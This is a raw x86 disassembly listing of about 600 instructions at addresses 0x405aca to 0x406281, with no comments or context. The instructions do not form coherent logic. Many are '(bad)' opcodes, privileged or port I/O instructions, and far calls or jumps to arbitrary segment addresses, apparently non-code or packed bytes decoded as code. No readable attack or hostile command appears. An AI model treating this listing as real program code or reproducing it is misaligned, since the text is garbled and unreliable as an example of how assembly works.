  405aca:	repnz cmp dl,ah
  405acd:	push   eax
  405ace:	pop    ds
  405acf:	mov    ecx,0x2dec9e2d
  405ad4:	sti    
  405ad5:	add    BYTE PTR [eax],dl
  405ad7:	rcl    bl,1
  405ad9:	sub    eax,0x2c4731c2
  405ade:	repz sub DWORD PTR [esi],edi
  405ae1:	fdiv   DWORD PTR ds:0x9cca48c8
  405ae7:	in     al,0x18
  405ae9:	adc    BYTE PTR [esi+esi*2],ch
  405aec:	push   ebp
  405aed:	xor    ebx,ecx
  405aef:	xor    BYTE PTR [eax],al
  405af1:	mov    ebx,esi
  405af3:	or     eax,0x6435edc7
  405af8:	test   esi,0x1c3a2c56
  405afe:	loope  0x405a94
  405b00:	mov    eax,esp
  405b02:	mov    ebx,0xe71c2376
  405b07:	rcr    DWORD PTR [ecx],1
  405b09:	std    
  405b0a:	call   0x182581a7
  405b0f:	mov    bh,0x73
  405b11:	pop    es
  405b12:	arpl   WORD PTR [edi+0x1ecf8fb0],ax
  405b18:	scas   eax,DWORD PTR es:[edi]
  405b19:	inc    esp
  405b1a:	in     eax,dx
  405b1b:	imul   ebp,ebp,0x25f3eff2
  405b21:	cmp    al,BYTE PTR [edx+edx*1-0x1f2460e0]
  405b28:	fcom   QWORD PTR [ecx-0x61e9746b]
  405b2e:	mov    al,0xbd
  405b30:	pop    ds
  405b31:	or     BYTE PTR [eax],0xac
  405b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b35:	iret   
  405b36:	mov    edi,0x39cf55a8
  405b3b:	je     0x405b09
  405b3d:	loop   0x405b0b
  405b3f:	xor    bh,ch
  405b41:	jmp    0x405ba1
  405b43:	xor    al,0xb5
  405b45:	jno    0x405ae8
  405b47:	cmp    edx,ebx
  405b49:	xchg   edx,eax
  405b4a:	aam    0xad
  405b4c:	cmp    esi,DWORD PTR [esi-0xa4eb04c]
  405b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b53:	mov    BYTE PTR [ebp+0x1ff94f24],bh
  405b59:	je     0x405b25
  405b5b:	push   ss
  405b5c:	imul   esp,DWORD PTR [ecx-0x24dece8d],0x65
  405b63:	xor    al,0x87
  405b65:	push   ebx
  405b66:	cmp    ah,BYTE PTR [ebp-0x48]
  405b69:	fbstp  TBYTE PTR [edx-0x76851700]
  405b6f:	sub    esp,esp
  405b71:	jp     0x405b13
  405b73:	std    
  405b74:	xchg   edx,eax
  405b75:	ficomp WORD PTR [esi+edi*8-0x73]
  405b79:	bound  esi,QWORD PTR [edx]
  405b7b:	(bad)  
  405b7c:	call   0x2dc35d9f
  405b81:	xor    BYTE PTR [ecx],0x75
  405b84:	(bad)  
  405b85:	stos   BYTE PTR es:[edi],al
  405b86:	outs   dx,BYTE PTR ds:[esi]
  405b87:	mov    esi,DWORD PTR [edi+0x3b]
  405b8a:	or     eax,0xb97a10aa
  405b8f:	pushf  
  405b90:	arpl   WORD PTR [edx+ecx*8-0x1e],ax
  405b94:	ss ins BYTE PTR es:[edi],dx
  405b96:	sbb    DWORD PTR ds:0x97b37a13,0xa831fb61
  405ba0:	sbb    BYTE PTR [ecx-0xf],ah
  405ba3:	pop    ecx
  405ba4:	add    eax,0xc7c488fc
  405ba9:	ret    0xd88a
  405bac:	push   eax
  405bad:	cld    
  405bae:	std    
  405baf:	push   esp
  405bb0:	pop    esp
  405bb1:	mov    al,0x3f
  405bb3:	mov    dl,0xc
  405bb5:	rcr    DWORD PTR [ebx+ecx*1+0x7a1d9ba0],0xd6
  405bbd:	or     eax,DWORD PTR [ebp+0x6e]
  405bc0:	(bad)  
  405bc1:	int3   
  405bc2:	sti    
  405bc3:	test   DWORD PTR [edi+0x1b97ad16],ecx
  405bc9:	xlat   BYTE PTR ds:[ebx]
  405bca:	pop    es
  405bcb:	std    
  405bcc:	stc    
  405bcd:	(bad)  
  405bce:	test   ebp,0x157fc950
  405bd4:	mov    eax,0x5f52d813
  405bd9:	int3   
  405bda:	fnstcw WORD PTR [ebx]
  405bdc:	jecxz  0x405bd6
  405bde:	cmp    ebp,edx
  405be0:	mov    eax,ds:0xf1d9c709
  405be5:	in     al,0xcd
  405be7:	arpl   WORD PTR [ebx],di
  405be9:	test   al,0xe8
  405beb:	(bad)  
  405bec:	sbb    ebp,DWORD PTR [eax]
  405bee:	test   BYTE PTR [ebp+0x4fc99c9a],dl
  405bf4:	jbe    0x405c36
  405bf6:	xor    DWORD PTR [ebx-0x12],0x60
  405bfa:	and    DWORD PTR [edi+0x5eb50c6c],eax
  405c00:	stc    
  405c01:	mov    bh,dh
  405c03:	jne    0x405c72
  405c05:	mov    ?,WORD PTR [esi+0x5b435581]
  405c0b:	repnz xchg ebp,eax
  405c0d:	int3   
  405c0e:	popf   
  405c0f:	ins    DWORD PTR es:[edi],dx
  405c10:	fisttp WORD PTR [edi+ecx*8]
  405c13:	jmp    0x5e19476f
  405c18:	fs aam 0x29
  405c1b:	push   ebx
  405c1c:	mov    eax,0xaf6d1a74
  405c21:	ret    0xbe1
  405c24:	dec    esp
  405c25:	jo     0x405c05
  405c27:	dec    edx
  405c28:	pop    ecx
  405c29:	mov    ebp,0x862dfee4
  405c2e:	test   DWORD PTR [ebx+0x70],0x759de0b
  405c35:	mov    eax,ds:0xb28c34b5
  405c3a:	les    esi,FWORD PTR [edx-0x74e2693d]
  405c40:	add    dl,dl
  405c42:	sar    DWORD PTR [ebx+0x1287f5d],cl
  405c48:	adc    al,0xe0
  405c4a:	xor    dh,BYTE PTR [eax-0x189cc593]
  405c50:	push   esp
  405c51:	mov    al,ds:0xa750debd
  405c56:	ins    BYTE PTR es:[edi],dx
  405c57:	xor    DWORD PTR [edx],ebx
  405c59:	out    dx,eax
  405c5a:	sbb    DWORD PTR [esi],eax
  405c5c:	sbb    edx,DWORD PTR [edi+ebp*1]
  405c5f:	das    
  405c60:	cmp    dl,BYTE PTR [ecx-0x43]
  405c63:	xchg   esi,eax
  405c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c65:	and    DWORD PTR [eax],eax
  405c67:	mov    edi,0x1bf04819
  405c6d:	arpl   WORD PTR [ebx-0xf],si
  405c70:	sete   BYTE PTR [eax+0x5]
  405c74:	stc    
  405c75:	pop    edi
  405c76:	xchg   ecx,eax
  405c77:	mov    al,0x44
  405c79:	sti    
  405c7a:	loope  0x405c55
  405c7c:	adc    al,0xa1
  405c7e:	pusha  
  405c7f:	stos   BYTE PTR es:[edi],al
  405c80:	add    al,0xf5
  405c82:	test   eax,edi
  405c84:	push   ebx
  405c85:	mov    ds,WORD PTR [ecx-0xec6403b]
  405c8b:	xchg   esp,eax
  405c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c8d:	pop    edi
  405c8e:	(bad)  
  405c8f:	gs pusha 
  405c91:	mov    ds,edx
  405c93:	add    ch,BYTE PTR [eax+eax*2+0x32]
  405c97:	inc    edx
  405c98:	cli    
  405c99:	and    eax,0x99fdf0a1
  405c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c9f:	and    esp,edi
  405ca1:	sub    ch,BYTE PTR [ebx-0x59]
  405ca4:	push   cs
  405ca5:	jp     0x405c63
  405ca7:	jecxz  0x405cc0
  405ca9:	test   DWORD PTR [ecx],0x89985ece
  405caf:	mov    edx,0xdba7c734
  405cb4:	mov    dh,0x21
  405cb6:	xchg   ecx,eax
  405cb7:	push   ebx
  405cb8:	hlt    
  405cb9:	dec    ax
  405cbb:	inc    esp
  405cbc:	popf   
  405cbd:	mov    BYTE PTR [esi+0x494e227c],dl
  405cc3:	inc    ecx
  405cc4:	or     esp,ecx
  405cc6:	repnz and al,0x90
  405cc9:	push   esi
  405cca:	dec    ebx
  405ccb:	test   BYTE PTR [ecx],bl
  405ccd:	das    
  405cce:	mov    cl,0x28
  405cd0:	xchg   edi,eax
  405cd1:	mov    ebx,0x16813f83
  405cd6:	loop   0x405ccd
  405cd8:	add    al,0x9f
  405cda:	mov    ds:0xace750a2,eax
  405cdf:	pop    eax
  405ce0:	sub    esp,DWORD PTR [ebx-0x4ee652ff]
  405ce6:	loop   0x405d33
  405ce8:	sub    al,0x49
  405cea:	(bad)  
  405ceb:	rcr    BYTE PTR [ebx],cl
  405ced:	jge    0x405d22
  405cef:	adc    eax,0x35f8d2dd
  405cf4:	mov    ds:0x1c461009,al
  405cf9:	popf   
  405cfa:	mov    esi,0xb543023c
  405cff:	cmp    edi,DWORD PTR [edx]
  405d01:	sub    BYTE PTR [ebp+edi*4+0x14b720f5],cl
  405d08:	dec    esp
  405d0a:	sub    DWORD PTR [edx+0x39f6fad8],ecx
  405d10:	(bad)  
  405d11:	shl    BYTE PTR gs:[edx-0x33],0xd7
  405d16:	ds jge 0x405cfb
  405d19:	mov    dh,0x63
  405d1b:	lds    edi,FWORD PTR [ecx-0x68]
  405d1e:	pop    edx
  405d1f:	hlt    
  405d20:	sub    ebp,edx
  405d22:	cmp    ah,BYTE PTR [esi]
  405d24:	dec    eax
  405d25:	add    al,0x77
  405d27:	or     al,0x7
  405d29:	shr    DWORD PTR [ecx+0x1d],1
  405d2c:	xor    DWORD PTR [ebp+0x33],esi
  405d2f:	fist   DWORD PTR ds:0x64beab6
  405d35:	sub    eax,0x7c8b7288
  405d3a:	in     eax,dx
  405d3b:	fcomp  DWORD PTR [edi]
  405d3d:	jmp    0x405d76
  405d3f:	xor    edi,esi
  405d41:	(bad)  
  405d42:	imul   ebp,DWORD PTR [edi-0x17],0x1c
  405d46:	das    
  405d47:	sar    BYTE PTR [edi],0x55
  405d4a:	adc    ecx,0x36
  405d4d:	fcom   QWORD PTR [edi]
  405d4f:	iret   
  405d50:	es dec ebx
  405d52:	out    0xd5,eax
  405d54:	xor    esp,DWORD PTR [ebx-0x5f]
  405d57:	addr16 test ecx,ebx
  405d5a:	jmp    0x405d28
  405d5c:	xchg   DWORD PTR [ebp+0x1f],edx
  405d5f:	mov    al,ds:0xb4c9ed27
  405d64:	inc    edi
  405d65:	stos   BYTE PTR es:[edi],al
  405d66:	sbb    eax,0x30d82bf3
  405d6b:	fnstenv [edi+0x50]
  405d6e:	stos   DWORD PTR es:[edi],eax
  405d6f:	and    bh,dl
  405d71:	cdq    
  405d72:	pop    es
  405d73:	mov    cl,0xf4
  405d75:	(bad)  
  405d76:	xor    ch,BYTE PTR [ecx+0x66cf3831]
  405d7c:	and    eax,0xe037e733
  405d81:	mov    ah,0xf7
  405d83:	ja     0x405d08
  405d85:	jl     0x405d11
  405d87:	cli    
  405d88:	jl     0x405d7c
  405d8a:	push   edx
  405d8b:	mov    edi,0x3ff8c45f
  405d90:	and    al,0x75
  405d92:	(bad)  
  405d93:	or     eax,0xeb3d59b5
  405d98:	inc    edx
  405d99:	cmp    al,0x93
  405d9b:	mov    ebp,0x1f272581
  405da0:	cmp    al,0xba
  405da2:	xchg   BYTE PTR [edx+edi*1],ch
  405da5:	sub    al,0x5e
  405da7:	dec    edi
  405da8:	popa   
  405da9:	lea    esp,[esi]
  405dab:	aam    0x73
  405dad:	add    ecx,DWORD PTR gs:[edi+0x1dbcd4ae]
  405db4:	mov    ah,BYTE PTR [ecx+eax*1-0x8c8bb7c]
  405dbb:	popf   
  405dbc:	and    al,0xf2
  405dbe:	xchg   ebx,eax
  405dbf:	sub    eax,0xa3206e4e
  405dc4:	add    edi,DWORD PTR [ebx-0x6b]
  405dc7:	mov    eax,ds:0x935fa15e
  405dcc:	hlt    
  405dcd:	add    al,0x22
  405dcf:	jb     0x405db5
  405dd1:	int3   
  405dd2:	mov    edx,0x5b750615
  405dd7:	imul   edi,DWORD PTR [ecx+0x1cefc4a0],0xffffffe9
  405dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ddf:	xchg   DWORD PTR ss:[eax+ecx*8-0x7],ebx
  405de4:	(bad)  
  405de5:	scas   eax,DWORD PTR es:[edi]
  405de6:	dec    eax
  405de7:	call   0x7cdf:0xa29d4743
  405dee:	sbb    esi,DWORD PTR [ebp+0x0]
  405df1:	pop    esi
  405df2:	push   0x36
  405df4:	sub    edx,DWORD PTR [ebx]
  405df6:	xchg   ecx,eax
  405df7:	sub    al,0xbb
  405df9:	cmc    
  405dfa:	mov    al,ds:0x88ee8e79
  405dff:	fcom   st(2)
  405e01:	jne    0x405e49
  405e03:	ss out dx,al
  405e05:	call   0xb846:0xc3e17cbb
  405e0c:	push   eax
  405e0d:	mov    ebp,0xb8bee012
  405e12:	or     DWORD PTR [ecx+0x37d4d141],esp
  405e18:	scas   al,BYTE PTR es:[edi]
  405e19:	sbb    al,dl
  405e1b:	scas   al,BYTE PTR es:[edi]
  405e1c:	sub    ch,BYTE PTR [esi+ebx*4-0x5e]
  405e20:	(bad)  [eax]
  405e22:	addr16 aad 0xb
  405e25:	push   ebp
  405e26:	or     bl,BYTE PTR [ebx+0x49]
  405e29:	sbb    eax,0x3117ae9e
  405e2e:	aas    
  405e2f:	cmp    eax,DWORD PTR [edx+0x70]
  405e32:	imul   BYTE PTR [edx+0x5]
  405e35:	test   DWORD PTR [esi+ebx*4+0x3ab8a5bf],esi
  405e3c:	xchg   esp,eax
  405e3d:	(bad)  
  405e3e:	adc    eax,0x217dab9d
  405e43:	shl    BYTE PTR [esi-0x2b],0x71
  405e47:	jecxz  0x405dd8
  405e49:	dec    esp
  405e4a:	je     0x405e66
  405e4c:	or     eax,0x858aa8bb
  405e51:	call   0xcf66:0xd83f970f
  405e58:	push   0x1c3b5eda
  405e5d:	xor    dh,cl
  405e5f:	push   es
  405e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e61:	sub    dh,al
  405e63:	xchg   esp,eax
  405e64:	fisttp DWORD PTR [edx-0x520804e6]
  405e6a:	ins    DWORD PTR es:[edi],dx
  405e6b:	pop    ebp
  405e6c:	test   BYTE PTR [ecx],bh
  405e6e:	cmc    
  405e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e70:	ds jmp 0x405e72
  405e73:	push   edx
  405e74:	pop    ds
  405e75:	push   eax
  405e76:	xor    BYTE PTR [eax-0x5],0x9e
  405e7a:	fwait
  405e7b:	and    eax,0x52428922
  405e80:	sub    al,0x10
  405e82:	mov    al,ds:0xaae7bae4
  405e87:	add    BYTE PTR [eax],al
  405e89:	ficom  DWORD PTR [edx+0x54]
  405e8c:	rcr    DWORD PTR [ecx+edx*4+0x6727d397],cl
  405e93:	mov    ds:0x970dfa9b,eax
  405e98:	fldcw  WORD PTR [edi-0x4dcb357a]
  405e9e:	and    BYTE PTR [esi+0x1ca863b2],cl
  405ea4:	ja     0x405e2b
  405ea6:	into   
  405ea7:	mov    edx,DWORD PTR [eax-0x19]
  405eaa:	je     0x405e46
  405eac:	pop    edx
  405ead:	aad    0x80
  405eaf:	test   dh,ah
  405eb1:	sub    DWORD PTR [ecx],ecx
  405eb3:	mov    dl,0xc0
  405eb5:	and    al,BYTE PTR [eax-0x5a]
  405eb8:	cmp    esi,DWORD PTR [eax-0x71]
  405ebb:	jno    0x405e81
  405ebd:	(bad)  
  405ebe:	fadd   DWORD PTR [edi+esi*1]
  405ec1:	cmp    ch,ah
  405ec3:	adc    al,0x84
  405ec5:	adc    al,0xd4
  405ec7:	mov    bl,0xbd
  405ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eca:	cmp    eax,0x2883ce81
  405ecf:	mov    ch,0xf9
  405ed1:	outs   dx,BYTE PTR ds:[esi]
  405ed2:	pushf  
  405ed3:	pushf  
  405ed4:	sbb    eax,0xd50acf2a
  405ed9:	shl    ecx,1
  405edb:	das    
  405edc:	hlt    
  405edd:	jg     0x405f09
  405edf:	cld    
  405ee0:	adc    dh,BYTE PTR [ebp+0x32d27e88]
  405ee6:	pop    edx
  405ee7:	mov    dh,0xb6
  405ee9:	adc    BYTE PTR [edi],bl
  405eeb:	inc    esi
  405eec:	cmc    
  405eed:	test   al,0x1e
  405eef:	(bad)  
  405ef0:	loopne 0x405f45
  405ef2:	cmp    eax,0x3c0f91a4
  405ef7:	inc    ecx
  405ef8:	arpl   WORD PTR [esi+ebp*4+0x572bb206],ax
  405eff:	add    cl,BYTE PTR fs:[ebp-0x9]
  405f03:	dec    ebx
  405f04:	xchg   esi,eax
  405f05:	lock ret 
  405f07:	sti    
  405f08:	or     DWORD PTR [ecx-0x48],esp
  405f0b:	rcr    DWORD PTR [ecx+edx*4+0x5f4d26be],cl
  405f12:	pusha  
  405f13:	mov    ds,WORD PTR [ebx-0x383179ac]
  405f19:	(bad)  
  405f1b:	fdiv   QWORD PTR [edx-0x1b]
  405f1e:	pop    ss
  405f1f:	stos   DWORD PTR es:[edi],eax
  405f20:	sub    ah,dh
  405f22:	rcr    BYTE PTR [ecx-0x59],0x5f
  405f26:	push   edi
  405f27:	call   0x192c:0x5c0b0047
  405f2e:	or     edx,0x3a811345
  405f34:	push   ds
  405f35:	xlat   BYTE PTR ds:[ebx]
  405f36:	push   ecx
  405f37:	jo     0x405ef4
  405f39:	stos   DWORD PTR es:[edi],eax
  405f3a:	in     eax,dx
  405f3b:	adc    eax,0x517a4972
  405f40:	fstp   TBYTE PTR [edi]
  405f42:	add    BYTE PTR [eax+0x38],bl
  405f45:	sahf   
  405f46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f47:	imul   edx,DWORD PTR [edi-0x1d],0xbe4990d2
  405f4e:	nop
  405f4f:	cmp    ecx,ebp
  405f51:	push   ecx
  405f52:	dec    eax
  405f53:	jmp    DWORD PTR [esi]
  405f55:	loope  0x405f8e
  405f57:	cmp    eax,0xd49e2b6f
  405f5c:	popf   
  405f5d:	cmp    eax,0x91dbba3e
  405f62:	adc    al,BYTE PTR [ebx]
  405f64:	int    0x55
  405f66:	sub    ecx,eax
  405f68:	imul   ecx,DWORD PTR [edi+0x62549728],0x844ef763
  405f72:	xor    al,0x57
  405f74:	scas   al,BYTE PTR es:[edi]
  405f75:	mov    edx,cr6
  405f78:	mov    ds:0x43f354c4,eax
  405f7d:	add    al,BYTE PTR [eax-0x43]
  405f80:	je     0x405f73
  405f82:	or     BYTE PTR [ecx],bl
  405f84:	retf   0xfa93
  405f87:	and    eax,0x5a25dda8
  405f8c:	pop    ebp
  405f8d:	lock repz pop ss
  405f90:	into   
  405f91:	in     al,dx
  405f92:	lods   al,BYTE PTR ds:[esi]
  405f93:	ffree  st(3)
  405f95:	ret    
  405f96:	data16 and al,0xb9
  405f99:	xchg   ebp,eax
  405f9a:	ret    
  405f9b:	mov    dh,0x25
  405f9d:	aam    0xaf
  405f9f:	xlat   BYTE PTR ds:[ebx]
  405fa0:	fdivr  QWORD PTR [ebx]
  405fa2:	loopne 0x405f5c
  405fa4:	dec    esi
  405fa5:	shl    BYTE PTR [ecx+0x26476ebf],cl
  405fab:	icebp  
  405fac:	fdiv   DWORD PTR ds:[esi]
  405faf:	lds    ebp,FWORD PTR [eax]
  405fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fb2:	aaa    
  405fb3:	inc    DWORD PTR [ebp+0x47]
  405fb6:	sbb    BYTE PTR [esi],dl
  405fb8:	xchg   BYTE PTR [edi+0x5fce8b42],ah
  405fbe:	push   esp
  405fbf:	xchg   DWORD PTR [edx+0x1606bde0],eax
  405fc5:	push   edx
  405fc6:	out    dx,al
  405fc7:	lahf   
  405fc8:	mov    esp,0xbc9d188e
  405fcd:	ficom  WORD PTR [edx+eiz*1]
  405fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd1:	mov    dl,0x28
  405fd3:	test   BYTE PTR [ebp-0x2f1d91d9],dh
  405fd9:	iret   
  405fda:	xor    ah,dh
  405fdc:	fldenv [ebp+ebp*2+0x5e]
  405fe0:	fwait
  405fe1:	aas    
  405fe2:	loope  0x405fac
  405fe4:	js     0x406049
  405fe6:	dec    ebx
  405fe7:	scas   al,BYTE PTR es:[edi]
  405fe8:	mov    bh,0x3e
  405fea:	stos   BYTE PTR es:[edi],al
  405feb:	mov    ah,0xc
  405fed:	push   ss
  405fee:	jae    0x406036
  405ff0:	add    esp,ebp
  405ff2:	sbb    DWORD PTR [edi],edx
  405ff4:	push   esi
  405ff5:	add    al,0xcc
  405ff7:	fwait
  405ff8:	nop
  405ff9:	in     eax,0x2d
  405ffb:	push   cs
  405ffc:	enter  0xb356,0xb1
  406000:	fs inc edi
  406002:	xchg   edx,eax
  406003:	out    dx,al
  406004:	xchg   esi,eax
  406005:	out    dx,eax
  406006:	jmp    0xe1d6:0xcc62e85c
  40600d:	lods   eax,DWORD PTR ds:[esi]
  40600e:	xchg   ecx,eax
  40600f:	inc    edi
  406010:	cmp    esp,DWORD PTR [edx+0x33]
  406013:	cmc    
  406014:	icebp  
  406015:	dec    esi
  406016:	ins    BYTE PTR es:[edi],dx
  406017:	in     eax,0x84
  406019:	lock jp 0x406014
  40601c:	int3   
  40601d:	lock mov bh,0x78
  406020:	je     0x40609e
  406022:	push   ds
  406023:	or     ebp,DWORD PTR [ecx+ecx*4]
  406026:	add    DWORD PTR [edx],edx
  406028:	shl    DWORD PTR [si],1
  40602b:	sub    eax,0x3eb822af
  406030:	add    eax,0x210b8d75
  406035:	inc    ebx
  406036:	outs   dx,BYTE PTR ds:[esi]
  406037:	test   eax,0x2b774cd1
  40603c:	gs pop esp
  40603e:	daa    
  40603f:	int3   
  406040:	ret    0xb522
  406043:	(bad)  
  406044:	sub    eax,0xe1f649c5
  406049:	stos   DWORD PTR es:[edi],eax
  40604a:	jp     0x40608e
  40604c:	sub    ch,BYTE PTR [esi+0xb]
  40604f:	jmp    0x114d4c7d
  406054:	push   cs
  406055:	nop
  406056:	out    0xb3,eax
  406058:	and    eax,0xf2b232fe
  40605d:	jge    0x40609b
  40605f:	ins    DWORD PTR es:[edi],dx
  406060:	xor    al,0xbf
  406062:	imul   edi,DWORD PTR [ebx],0x58362960
  406068:	inc    ebp
  406069:	push   0x1897431d
  40606e:	fadd   st(1),st
  406070:	xor    ah,BYTE PTR [eax+0x352cfeb6]
  406076:	aad    0xd5
  406078:	in     eax,0x69
  40607a:	jp     0x4060a8
  40607c:	dec    edi
  40607d:	ret    0xcc31
  406080:	ja     0x4060d1
  406082:	dec    edx
  406083:	mov    eax,0x8d8f388e
  406088:	adc    DWORD PTR [ecx+0x24],edx
  40608b:	push   cs
  40608c:	call   0xc326e28b
  406091:	mov    edx,0xbe336b33
  406096:	dec    edi
  406097:	fwait
  406098:	rcr    DWORD PTR [edi+0x4d2645c2],1
  40609e:	ss sahf 
  4060a0:	data16 jg 0x406069
  4060a3:	test   BYTE PTR [ebp+0x37],bl
  4060a6:	xchg   DWORD PTR [esi+edi*4],ebp
  4060a9:	and    BYTE PTR [ecx+eax*2],cl
  4060ac:	loop   0x406042
  4060ae:	ret    
  4060af:	lahf   
  4060b0:	jb     0x4060e0
  4060b2:	sbb    dl,BYTE PTR [edx+0x48]
  4060b5:	sub    al,0x8b
  4060b7:	rcr    DWORD PTR [edi-0x6625cbfe],1
  4060bd:	loop   0x4060e5
  4060bf:	repz mov edi,0x1da6a96
  4060c5:	xlat   BYTE PTR ds:[ebx]
  4060c6:	in     al,dx
  4060c7:	cmc    
  4060c8:	jne    0x40612c
  4060ca:	sbb    eax,esp
  4060cc:	mov    BYTE PTR [ecx-0x312c39],dl
  4060d2:	call   0x9d85:0xccb572fe
  4060d9:	xor    bh,BYTE PTR [esi]
  4060db:	xchg   esi,eax
  4060dc:	inc    eax
  4060dd:	outs   dx,DWORD PTR ds:[esi]
  4060de:	xchg   ecx,eax
  4060df:	sub    eax,ebp
  4060e1:	cmc    
  4060e2:	ficom  WORD PTR [ebx-0x1cc0f872]
  4060e8:	xchg   ecx,eax
  4060e9:	in     al,dx
  4060ea:	sub    eax,0xf6f4449f
  4060ef:	fcomp  DWORD PTR [ecx]
  4060f1:	jns    0x4060fa
  4060f3:	adc    BYTE PTR [eax],0x59
  4060f6:	fs call 0x3b0a:0xce2483ed
  4060fe:	dec    edx
  4060ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406100:	leave  
  406101:	packuswb mm1,QWORD PTR [esi]
  406104:	sub    al,0x42
  406106:	jge    0x4060e8
  406108:	stos   DWORD PTR es:[edi],eax
  406109:	push   esi
  40610a:	aas    
  40610b:	rcl    DWORD PTR [ebp+0x5f],cl
  40610e:	sub    al,0x99
  406110:	add    BYTE PTR [esi-0x7eb72e7a],dh
  406116:	popa   
  406117:	xchg   edx,eax
  406118:	adc    al,0x46
  40611a:	pop    es
  40611b:	pop    eax
  40611c:	mov    eax,0xdcac327f
  406121:	jno    0x4060b8
  406123:	fcomp  QWORD PTR [ecx]
  406125:	xor    DWORD PTR [edi],edi
  406127:	fwait
  406128:	mov    bh,0x4c
  40612a:	imul   DWORD PTR [edx-0x1f18c788]
  406130:	add    al,0xee
  406132:	jns    0x4060c3
  406134:	sub    dh,BYTE PTR [edx+0x4ee864f5]
  40613a:	push   esi
  40613b:	inc    esp
  40613c:	sub    eax,0x143c5731
  406141:	add    BYTE PTR [edx+eax*8+0x79],0x16
  406146:	fwait
  406147:	add    ch,ch
  406149:	icebp  
  40614a:	jg     0x4061ad
  40614c:	neg    BYTE PTR [edx]
  40614e:	loope  0x40616b
  406150:	pop    edi
  406151:	or     esp,DWORD PTR [ebp-0x2a57495c]
  406157:	adc    DWORD PTR [edi+ebp*8-0x584d25f5],0x698bb9a3
  406162:	inc    ecx
  406163:	shl    DWORD PTR [ebx],0x6c
  406166:	pop    esp
  406167:	cmp    al,0x91
  406169:	push   esi
  40616a:	ds push cs
  40616c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40616d:	in     eax,0xab
  40616f:	arpl   dx,dx
  406171:	lds    esp,FWORD PTR [eax+0x109367be]
  406177:	ret    0x5c2a
  40617a:	mov    al,0xde
  40617c:	cmp    esp,DWORD PTR [eax+0x14]
  40617f:	cmp    al,BYTE PTR [esi+ecx*4-0x20]
  406183:	mov    dl,0x46
  406185:	cdq    
  406186:	add    BYTE PTR [ebx+0x790624ab],0x38
  40618d:	cli    
  40618e:	in     al,dx
  40618f:	js     0x4061db
  406191:	icebp  
  406192:	push   0x1880210f
  406197:	jbe    0x406134
  406199:	shr    esp,0xcd
  40619c:	sub    eax,0x23c2b8c5
  4061a1:	aas    
  4061a2:	ins    DWORD PTR es:[edi],dx
  4061a3:	lods   al,BYTE PTR ds:[esi]
  4061a4:	inc    edx
  4061a5:	ret    
  4061a6:	pop    ecx
  4061a7:	xchg   esp,eax
  4061a8:	test   DWORD PTR [esi+0xa],esp
  4061ab:	push   es
  4061ac:	call   0x90579449
  4061b1:	pushf  
  4061b2:	retf   0x249f
  4061b5:	out    0xcc,eax
  4061b7:	out    dx,eax
  4061b8:	mov    esp,0x150f82fa
  4061bd:	jmp    0x9fa543fe
  4061c2:	cmp    edx,ecx
  4061c4:	pop    ebp
  4061c5:	test   bh,0x82
  4061c8:	cmp    eax,0xece48644
  4061cd:	and    BYTE PTR [esi],dh
  4061cf:	adc    dh,BYTE PTR ds:0x86a94ad8
  4061d5:	ss scas eax,DWORD PTR es:[edi]
  4061d7:	test   al,0x35
  4061d9:	pop    eax
  4061da:	in     eax,0xe2
  4061dc:	hlt    
  4061dd:	xor    eax,DWORD PTR [edx-0x228883ff]
  4061e3:	fild   QWORD PTR [eax+ebp*4]
  4061e6:	fistp  QWORD PTR [ebx+0x2eea3b20]
  4061ec:	mov    dh,0xad
  4061ee:	(bad)  
  4061ef:	xor    BYTE PTR [eax+0x23d7b342],ch
  4061f5:	or     al,0x5e
  4061f7:	inc    ebp
  4061f8:	sbb    eax,0xcc25a3b0
  4061fd:	add    DWORD PTR [ecx],0xbc19b92d
  406203:	pushf  
  406204:	mov    ch,0x80
  406206:	imul   ecx,DWORD PTR [eax+eax*8-0x2e],0xffffffca
  40620b:	out    dx,eax
  40620c:	cmp    DWORD PTR [edi],esp
  40620e:	sbb    al,0x8c
  406210:	xchg   ecx,eax
  406211:	test   eax,0x30f0023
  406216:	xchg   edx,eax
  406217:	js     0x406216
  406219:	sbb    edi,esp
  40621b:	(bad)  
  40621c:	inc    edi
  40621d:	inc    edx
  40621e:	(bad)  
  40621f:	in     eax,dx
  406220:	jl     0x4061bd
  406222:	loope  0x406296
  406224:	aaa    
  406225:	ds push 0x4369dfdc
  40622b:	add    BYTE PTR [esi],bh
  40622d:	cmc    
  40622e:	pop    ebx
  40622f:	xor    eax,0xaa4fc7a9
  406234:	xor    ah,dl
  406236:	mov    ah,0xa4
  406238:	dec    ecx
  406239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40623a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40623b:	mov    ebp,0x565084af
  406240:	lds    ebx,FWORD PTR [edi-0x6443d2f3]
  406246:	mov    cl,0x5
  406248:	mov    al,0xa1
  40624a:	call   0x5a84:0xa7363410
  406251:	mov    ch,0x13
  406253:	nop
  406254:	out    dx,eax
  406255:	mov    dl,0xc8
  406257:	retf   
  406258:	adc    ecx,DWORD PTR [edx+0x1d]
  40625b:	addr16 cli 
  40625d:	push   esp
  40625e:	xchg   ebx,eax
  40625f:	sar    esi,1
  406261:	adc    esi,esi
  406263:	nop
  406264:	mov    esi,0xa855ed4b
  406269:	std    
  40626a:	(bad)  
  40626b:	adc    ebp,DWORD PTR [esi+0x11]
  40626e:	in     eax,0xc9
  406270:	out    0x8,eax
  406272:	int    0xf
  406274:	fdiv   DWORD PTR [ebx-0x28e037e]
  40627a:	inc    edi
  40627b:	nop
  40627c:	std    
  40627d:	ror    BYTE PTR [ebp-0x72],cl
  406280:	popa   
  406281:	imul   ebx,DWORD PTR [eax],0xd5497998
